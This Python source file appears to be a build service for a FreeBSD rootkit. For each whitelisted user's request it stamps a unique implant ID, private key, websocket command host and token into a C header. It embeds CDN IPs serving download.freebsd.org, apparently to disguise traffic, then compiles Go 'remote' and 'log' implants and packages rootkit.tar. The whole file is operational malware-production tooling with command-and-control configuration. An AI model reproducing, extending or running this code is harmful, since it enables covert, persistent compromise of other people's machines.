import asyncio
import hashlib
import hmac, json, logging
import os, re
import secrets
import shutil, socket, subprocess, sys, time

botlog = logging.getLogger("botbuild")

curwd = os.path.dirname(os.path.abspath(__file__))
repo = curwd + "/.."
buildjunkdir = curwd + "/buildjunks"
TIMEOUT = 900

# ONE FUCKING VM AT A TIME SO MY BOX DOESNT EXPLODE
# 3 builds queued max
lock = asyncio.Lock()
waiting = 0

# for dualhooking soon tm
_hkey = os.environ.get("HMACKEY", "").encode()

if len(_hkey) < 32:
	print("HMACKEY missing or under 32 bytes in .env", file=sys.stderr)
	raise SystemExit(1)


def link_token(uid):
	return hmac.new(_hkey, str(uid).encode(), hashlib.sha256).hexdigest()[:12]


def jwtshellgen(mid, mname, uid, pub=None, minutes=30):
	import jwt
	claims = {"m": mid, "n": mname, "u": uid, "exp": int(time.time())+minutes*60}
	if pub:
		claims["pub"] = pub
	return jwt.encode(claims, _hkey, algorithm="HS256")


def verify_shell(tok):
	import jwt
	try:
		return jwt.decode(tok, _hkey, algorithms=["HS256"])
	except Exception:
		return None

live = []
live_title = "idle"
ws_clients = set()


async def push(line):
	# fan a new log line out to every connected browser
	for ws in list(ws_clients):
		try:
			await ws.send_str(line)
		except Exception:
			ws_clients.discard(ws)


class BuildError(Exception):
	def __init__(self, log_tail):
		super().__init__("build failed")
		self.log_tail = log_tail


class QueueFull(Exception):
	pass


def allowed(uid):
	with open(f"{curwd}/whitelist.json") as f:
		wl = json.load(f)

	return str(uid) in wl["users"]


def queue_len():
	return waiting + (1 if lock.locked() else 0)


DD_HEADER = """// per-build identity stamped by the builder (generated)
#ifndef DD_CONF_H
#define DD_CONF_H

#define DD_ID 0x%016xULL

// per-build kit keypair (private half; public is in the registry)
#define KIT_PRIV_HEX \"%s\"

// cloudflare worker transport
#define WS_HOST \"%s\"
#define WS_IP \"%s\"
#define WS_TOKEN \"%s\"

// fastly anycast ips serving download.freebsd.org
#define CDN1 \"151.101.1.242\"
#define CDN2 \"151.101.65.242\"

#endif
"""


def stamp_dd(mode):
	path = f"{repo}/src/shellproxy/dd_conf.h"
	backup = open(path).read() if os.path.exists(path) else None
	if mode == "full":
		import pysodium
		dd = secrets.randbits(64)
		pub, priv = pysodium.crypto_box_keypair()
		worker = os.environ.get("MQTT_WORKER", "").partition(":")[0]
		token = os.environ.get("MQTT_TOKEN", "")
		try:
			ws_ip = socket.gethostbyname(worker) if worker else ""
		except OSError:
			ws_ip = ""
		with open(path, "w") as f:
			f.write(DD_HEADER % (dd, priv.hex(), worker, ws_ip, token))
		return f"{dd:016x}", backup, pub.hex()
	if backup is not None:
		os.remove(path)
	return None, backup, None


def restore_dd(backup):
	path = f"{repo}/src/shellproxy/dd_conf.h"
	if backup is None:
		if os.path.exists(path):
			os.remove(path)
	else:
		with open(path, "w") as f:
			f.write(backup)


DEFAULT_REMOTE_PUB = "e4353550c44b1c499f46f39454fb703f67265a75899a52f8d04328300dfb7e5e"


def build_remote(pub):
	env = os.environ.copy()
	env.update({
		"CGO_ENABLED": "0",
		"GOOS": "freebsd",
		"GOARCH": "amd64",
		"GOFLAGS": "-mod=vendor",
	})
	for name in ("remote", "log"):
		result = subprocess.run(
			["go", "build", "-trimpath",
				"-ldflags", f"-s -w -X main.kitPubHex={pub}",
				"-o", name, "."],
			cwd=f"{repo}/remote",
			env=env,
			capture_output=True,
			text=True)
		if result.returncode != 0:
			raise BuildError((result.stderr or result.stdout)[-1500:])


async def run(uid, name, features, mode="full"):
	global waiting
	if queue_len() >= 4:
		raise QueueFull()
	os.makedirs(buildjunkdir, exist_ok=True)
	waiting += 1
	async with lock:
		# brittle i dont care
		waiting -= 1
		live.clear()

		botlog.info(f"build start: {name} (features: {list(features)})")

		dd, dd_backup, dd_pub = stamp_dd(mode)
		remote_pub = dd_pub or DEFAULT_REMOTE_PUB
		await asyncio.to_thread(build_remote, remote_pub)
		if dd:
			await push(f"+ dd {dd} + pub {dd_pub}")
			botlog.info(f"+ dd {dd} + pub {dd_pub}")
		
		cfgpath = f"{repo}/config.json"
		backup = open(cfgpath).read() if os.path.exists(cfgpath) else None
		
		cfg = json.loads(backup) if backup else {}

		for key, on in features.items():
			if on:
				cfg[key] = True

		with open(cfgpath, "w") as f:
			json.dump(cfg, f, indent=1)
		
		try:
			proc = await asyncio.create_subprocess_exec(
				"perl", "vmbuild.pl", "fresh",
				cwd=repo,
				stdout=asyncio.subprocess.PIPE,
				stderr=asyncio.subprocess.STDOUT
			)
			chunks = []

			async def drain():
				while True:
					line = await proc.stdout.readline()
					if not line:
						break
					s = line.decode(errors="replace").rstrip()
					chunks.append(s + "\n")
					live.append(s)
					await push(s)
					botlog.info(s)

			try:
				await asyncio.wait_for(drain(), TIMEOUT)
			except asyncio.TimeoutError:
					proc.kill()
					raise BuildError("timeout")
			await proc.wait()
			out = "".join(chunks)
			if proc.returncode != 0:
				raise BuildError(out[-1500:])
			src = f"{repo}/rootkit.tar"

			dst = f"{buildjunkdir}/{name}.tar"

			shutil.copy(src, dst)

			botlog.info(f"build done {dst} dd={dd}")
			return dst, out, dd, dd_pub
		finally:
			restore_dd(dd_backup)
			if backup is not None:
				with open(cfgpath, "w") as f:
					f.write(backup)
